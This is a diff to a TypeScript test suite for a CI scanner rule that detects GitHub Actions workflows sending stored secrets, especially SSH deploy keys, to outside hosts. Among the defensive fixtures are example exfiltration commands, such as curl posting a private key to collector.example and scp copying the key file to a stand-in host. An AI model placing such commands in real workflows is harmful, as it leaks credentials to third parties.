@@ -12,6 +12,7 @@ import * as fs from "node:fs";
 import * as path from "node:path";
 import * as os from "node:os";
 import { modelWorkflows } from "../workflow-modeler.js";
+import { scan } from "../scanner.js";
 import { performanceBudget } from "./performance-budget.js";
 
 const RULE = "WORKFLOW_SECRET_TO_UPLOAD_PATH";
@@ -56,7 +57,6 @@ describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: a stored secret and egress in one work
     ["bracket access", ["      - env:", "          T: ${{ secrets['NPM_TOKEN'] }}", '        run: wget --post-data "$T" https://x.example']],
     ["the whole secrets context", ["      - env:", "          ALL: ${{ toJSON(secrets) }}", "        run: echo ok"], "      - uses: actions/upload-artifact@v4"],
     ["an artifact upload", ["      - env: { T: \"${{ secrets.NPM_TOKEN }}\" }", '        run: echo "$T" > k.txt', "      - uses: actions/upload-artifact@v4", "        with:", "          path: k.txt"]],
-    ["ssh with a deploy key", ['      - env: { KEY: "${{ secrets.SSH_PRIVATE_KEY }}" }', '        run: echo "$KEY" > k && ssh -i k deploy@x.example ./deploy.sh']],
     ["scp to a remote host", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: scp out.txt user@x.example:/tmp/"]],
     ["python requests", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', `        run: python3 -c "import requests; requests.post('https://x.example', data='x')"`]],
     ["git push to a remote that is not GitHub", ['      - env: { T: "${{ secrets.NPM_TOKEN }}" }', "        run: git push https://x.example/r.git HEAD"]],
@@ -185,6 +185,193 @@ describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: what the finer check does not count", 
   });
 });
 
+/**
+ * An ssh, scp or rsync connection authenticated by a deploy key does not send
+ * the key: the key signs a challenge and stays on the runner. 6.3.0 counted
+ * every such connection to a host as egress, so every push-to-deploy workflow
+ * whose only secret is its deploy key was reported (measured across a fleet of
+ * repositories, several of which gate on medium). A connection still counts
+ * whenever the key, or any other secret, can travel over it.
+ */
+const KEY_ENV = '      - env: { KEY: "${{ secrets.SSH_PRIVATE_KEY }}" }';
+
+describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: a deploy key used only to authenticate", () => {
+  it.each([
+    ["ssh with a deploy key", [KEY_ENV, '        run: echo "$KEY" > k && ssh -i k deploy@x.example ./deploy.sh']],
+    ["a key written through tr, checked locally, used and removed", [
+      "      - env:",
+      "          SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}",
+      "        run: |",
+      "          mkdir -p ~/.ssh && chmod 700 ~/.ssh",
+      '          if [ -z "${SSH_PRIVATE_KEY:-}" ]; then echo "::error::no key"; exit 1; fi',
+      "          printf '%s\\n' \"$SSH_PRIVATE_KEY\" | tr -d '\\r' > ~/.ssh/deploy_key",
+      "          chmod 600 ~/.ssh/deploy_key",
+      "          if ! ssh-keygen -y -f ~/.ssh/deploy_key >/dev/null 2>&1; then exit 1; fi",
+      "          ssh -F /dev/null -i ~/.ssh/deploy_key \\",
+      '              -o UserKnownHostsFile="${RUNNER_TEMP}/known_hosts" \\',
+      "              -o StrictHostKeyChecking=yes -p 2222 deploy@x.example \\",
+      "            bash -s << 'ENDSSH'",
+      "            set -e",
+      "            cd /srv/app && git pull --ff-only origin main",
+      "          ENDSSH",
+      "      - if: always()",
+      "        run: rm -f ~/.ssh/deploy_key",
+    ]],
+    ["a key directory handed to the next step through GITHUB_ENV", [
+      KEY_ENV,
+      "        run: |",
+      '          key_dir="$(mktemp -d)"',
+      "          printf '%s\\n' \"$KEY\" | tr -d '\\r' > \"${key_dir}/deploy_key\"",
+      '          chmod 600 "${key_dir}/deploy_key"',
+      '          echo "DEPLOY_KEY_DIR=${key_dir}" >> "$GITHUB_ENV"',
+      "      - run: |",
+      '          ssh -F /dev/null -A -i "${DEPLOY_KEY_DIR}/deploy_key" -o BatchMode=yes deploy@x.example true',
+      '          rm -rf "${DEPLOY_KEY_DIR}"',
+    ]],
+    ["a key under RUNNER_TEMP, quoted", [
+      KEY_ENV,
+      "        run: |",
+      '          printf \'%s\\n\' "$KEY" > "$RUNNER_TEMP/ssh/deploy_key"',
+      '          test -s "$RUNNER_TEMP/ssh/deploy_key"',
+      '          ssh -i "${RUNNER_TEMP}/ssh/deploy_key" deploy@x.example true',
+    ]],
+    ["a remote script piped into ssh", [
+      KEY_ENV,
+      "        run: |",
+      "          script='set -e; cd /srv/app && git pull --ff-only origin main'",
+      '          echo "$KEY" > "$RUNNER_TEMP/deploy_key"',
+      "          printf '%s' \"$script\" | ssh -F /dev/null -i \"$RUNNER_TEMP/deploy_key\" deploy@x.example 'bash -s'",
+    ]],
+    ["scp of a build artifact", [KEY_ENV, '        run: echo "$KEY" > k && scp -i k dist.tar.gz deploy@x.example:/srv/']],
+    ["rsync over ssh with the key", [KEY_ENV, '        run: echo "$KEY" > k && rsync -az -e "ssh -i k -p 2222" dist/ deploy@x.example:/srv/']],
+    ["a default identity file", [KEY_ENV, '        run: echo "$KEY" > ~/.ssh/id_ed25519 && chmod 600 ~/.ssh/id_ed25519 && ssh deploy@x.example ./deploy.sh']],
+    ["known_hosts and key from secrets", [
+      "      - env:",
+      "          KEY: ${{ secrets.SSH_PRIVATE_KEY }}",
+      "          HOSTS: ${{ secrets.SSH_KNOWN_HOSTS }}",
+      '        run: echo "$HOSTS" >> ~/.ssh/known_hosts && echo "$KEY" > k && ssh -i k deploy@x.example true',
+    ]],
+    ["a key handed to ssh-add", [KEY_ENV, '        run: echo "$KEY" | ssh-add - && ssh deploy@x.example true']],
+    ["a key inline in the run body", ['      - run: echo "${{ secrets.SSH_PRIVATE_KEY }}" > k && ssh -i k deploy@x.example true']],
+    ["webfactory/ssh-agent", [
+      "      - uses: webfactory/ssh-agent@a6f90b1f127823b31d4d4a8d96047790581349bd # v0.9.0",
+      "        with:",
+      "          ssh-private-key: ${{ secrets.SSH_PRIVATE_KEY }}",
+      "      - run: ssh deploy@x.example ./deploy.sh",
+    ]],
+    ["a presence check in its own step", [
+      KEY_ENV,
+      '        run: if [ -z "$KEY" ]; then exit 1; fi',
+      KEY_ENV,
+      '        run: echo "$KEY" > k && ssh -i k deploy@x.example true',
+    ]],
+    ["an ssh_config IdentityFile", [
+      KEY_ENV,
+      "        run: |",
+      '          echo "$KEY" > ~/.ssh/deploy_key',
+      "          cat > ~/.ssh/config <<'EOF'",
+      "          Host prod",
+      "            IdentityFile ~/.ssh/deploy_key",
+      "          EOF",
+      "          ssh prod true",
+    ]],
+  ])("does not report %s", (_label, steps) => {
+    workflow([...HEAD, ...bracketed(steps)]);
+    expect(files()).toEqual([]);
+  });
+
+  it.each([
+    ["the key copied to the host", [KEY_ENV, '        run: echo "$KEY" > k && scp -i k k deploy@x.example:/tmp/']],
+    ["the key on ssh's stdin", [KEY_ENV, "        run: echo \"$KEY\" > k && ssh -i k deploy@x.example 'cat > k' < k"]],
+    ["the key piped into ssh", [KEY_ENV, "        run: echo \"$KEY\" > k && cat k | ssh -i k deploy@x.example 'cat > k'"]],
+    ["the key read into the remote command", [KEY_ENV, '        run: echo "$KEY" > k && ssh -i k deploy@x.example "echo $(cat k)"']],
+    ["the key variable in the remote command", [KEY_ENV, '        run: echo "$KEY" > k && ssh -i k deploy@x.example "echo $KEY"']],
+    ["the key file handed over as rsync's source", [KEY_ENV, '        run: echo "$KEY" > k && rsync -e "ssh -i k" k deploy@x.example:/tmp/']],
+    ["a local copy of the key, then sent", [KEY_ENV, '        run: echo "$KEY" > k && cp k out && scp -i k out deploy@x.example:/tmp/']],
+    ["a key encoded and sent", [KEY_ENV, '        run: echo "$KEY" | base64 > k.b64 && scp k.b64 deploy@x.example:/tmp/']],
+    ["a secret written to a file ssh never authenticates with", [KEY_ENV, '        run: echo "$KEY" > payload.txt && scp payload.txt deploy@x.example:/tmp/']],
+    ["a key sent by SendEnv", [KEY_ENV, '        run: echo "$KEY" > k && ssh -i k -o SendEnv=KEY deploy@x.example true']],
+    ["a second secret in the remote command", [
+      "      - env:",
+      "          KEY: ${{ secrets.SSH_PRIVATE_KEY }}",
+      "          DB: ${{ secrets.DB_PASSWORD }}",
+      '        run: echo "$KEY" > k && ssh -i k deploy@x.example "export DB=$DB; ./migrate.sh"',
+    ]],
+    ["a second secret only in the environment", [
+      "      - env:",
+      "          KEY: ${{ secrets.SSH_PRIVATE_KEY }}",
+      "          TOKEN: ${{ secrets.API_TOKEN }}",
+      '        run: echo "$KEY" > k && ssh -i k deploy@x.example ./deploy.sh',
+    ]],
+    ["a secret handed to an action that is not an ssh agent", [
+      "      - uses: some-org/deploy@0123456789abcdef0123456789abcdef01234567",
+      "        with:",
+      "          ssh-private-key: ${{ secrets.SSH_PRIVATE_KEY }}",
+      "      - run: ssh deploy@x.example ./deploy.sh",
+    ]],
+    ["a key printed to the log", [KEY_ENV, '        run: echo "$KEY" && ssh deploy@x.example true']],
+    ["a secret written to a file ssh never uses", [KEY_ENV, '        run: echo "$KEY" > ~/.npmrc && ssh deploy@x.example true']],
+    ["a key copied with install, then sent", [KEY_ENV, '        run: echo "$KEY" > k && install -m 600 k out && scp -i k out deploy@x.example:/tmp/']],
+    ["the workspace synced while the key sits in it", [KEY_ENV, '        run: echo "$KEY" > k && rsync -az -e "ssh -i k" ./ deploy@x.example:/srv/']],
+    ["the workspace copied by a glob while the key sits in it", [KEY_ENV, '        run: echo "$KEY" > k && scp -i k * deploy@x.example:/srv/']],
+    ["the key's directory copied", [KEY_ENV, '        run: echo "$KEY" > ~/.ssh/deploy_key && scp -r -i ~/.ssh/deploy_key ~/.ssh deploy@x.example:/tmp/']],
+    ["an archive piped into ssh", [KEY_ENV, "        run: echo \"$KEY\" > k && tar cz . | ssh -i k deploy@x.example 'tar xz'"]],
+    ["a key file sent from the next step under another directory name", [
+      KEY_ENV,
+      '        run: key_dir="$(mktemp -d)" && echo "$KEY" > "${key_dir}/deploy_key" && echo "DEPLOY_KEY_DIR=${key_dir}" >> "$GITHUB_ENV"',
+      '      - run: scp -i "${DEPLOY_KEY_DIR}/deploy_key" "${DEPLOY_KEY_DIR}/deploy_key" deploy@x.example:/tmp/',
+    ]],
+  ])("reports %s", (_label, steps) => {
+    workflow([...HEAD, ...bracketed(steps)]);
+    expect(files()).toEqual([".github/workflows/ci.yml"]);
+  });
+});
+
+describe("WORKFLOW_SECRET_TO_UPLOAD_PATH through scan(): a push-to-deploy workflow", () => {
+  // The dotted form, as real workflows write it, so the earlier condition is
+  // evaluated too. The control sends the same key out with curl.
+  const deploy = (last: string): string[] => [
+    "name: deploy",
+    "on:",
+    "  push:",
+    "    branches: [main]",
+    "permissions:",
+    "  contents: read",
+    "jobs:",
+    "  deploy:",
+    "    runs-on: ubuntu-latest",
+    "    steps:",
+    "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1",
+    "        with:",
+    "          persist-credentials: false",
+    "      - name: Deploy",
+    "        env:",
+    "          SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}",
+    "        run: |",
+    "          install -m 700 -d ~/.ssh",
+    "          printf '%s\\n' \"$SSH_PRIVATE_KEY\" > ~/.ssh/deploy_key",
+    "          chmod 600 ~/.ssh/deploy_key",
+    `          ${last}`,
+  ];
+  const rules = async (): Promise<string[]> =>
+    (await scan({ target: dir, format: "json", noHistory: true })).findings.map((f) => f.rule).filter((r) => r === RULE);
+
+  it("does not report the key used to log in", async () => {
+    workflow(deploy("ssh -F /dev/null -i ~/.ssh/deploy_key -o StrictHostKeyChecking=yes deploy@deploy.example 'bash -s' < scripts/remote.sh"), "deploy.yml");
+    expect(await rules()).toEqual([]);
+  });
+
+  it("reports the same key sent out with curl (the control)", async () => {
+    workflow(deploy('curl -s -d "$SSH_PRIVATE_KEY" https://collector.example/in'), "deploy.yml");
+    expect(await rules()).toEqual([RULE]);
+  });
+
+  it("reports the same key file sent to the host", async () => {
+    workflow(deploy("scp -i ~/.ssh/deploy_key ~/.ssh/deploy_key deploy@deploy.example:/tmp/"), "deploy.yml");
+    expect(await rules()).toEqual([RULE]);
+  });
+});
+
 describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: each file on its own", () => {
   it("keeps scanning the files after one it cannot classify", () => {
     // A huge first file must not end the loop for the ones after it.
@@ -226,6 +413,15 @@ describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: linear on 5 MiB input", () => {
     ["loopback URL words", () => [...HEAD, '      - env: { T: "${{ secrets.X }}" }', `        run: node a.js ${"http://localhost/ ".repeat(Math.ceil(FIVE_MIB / 17))}`]],
     ["proxy variables", () => [...HEAD, `      - env: { T: "\${{ secrets.X }}", ${"http_proxy=localhost, ".repeat(Math.ceil(FIVE_MIB / 23))} }`, "        run: curl localhost"]],
     ["a long flow-map step", () => [...HEAD, `      - { run: '${"{a, ".repeat(Math.ceil(FIVE_MIB / 4))}' }`, '      - env: { T: "${{ secrets.X }}" }']],
+    // The deploy-key check reads every word once per key file, and gives up
+    // past a handful of key files.
+    ["key writes", () => [...HEAD, '      - env: { K: "${{ secrets.X }}" }', `        run: ${'echo "$K" > k; '.repeat(Math.ceil(FIVE_MIB / 16))} ssh -i k x.example true`]],
+    ["key writes to distinct files", () => [...HEAD, '      - env: { K: "${{ secrets.X }}" }', "        run: |", ...Array.from({ length: Math.ceil(FIVE_MIB / 24) }, (_, i) => `          echo "$K" > k${i}`), "          ssh x.example true"]],
+    ["one long ssh line naming the key", () => [...HEAD, '      - env: { K: "${{ secrets.X }}" }', `        run: echo "$K" > k && ssh -i k x.example ${"k ".repeat(Math.ceil(FIVE_MIB / 2))}`]],
+    // Every occurrence is an allowed use, so nothing ends the loop early.
+    ["one ssh line of allowed key uses", () => [...HEAD, '      - env: { K: "${{ secrets.X }}" }', `        run: echo "$K" > k && ssh ${"-i k ".repeat(Math.ceil(FIVE_MIB / 6))} x.example true`]],
+    // Each ssh stage looks at what was piped in before it.
+    ["a long pipe chain into ssh stages", () => [...HEAD, '      - env: { K: "${{ secrets.X }}" }', `        run: echo "$K" > k && printf x ${"| ssh -i k x.example cat ".repeat(Math.ceil(FIVE_MIB / 26))}`]],
   ] as Array<[string, () => string[]]>)("%s", { timeout: performanceBudget(60_000) }, (_label, build) => {
     expect(timed(build())).toBeLessThan(performanceBudget(15_000));
   });
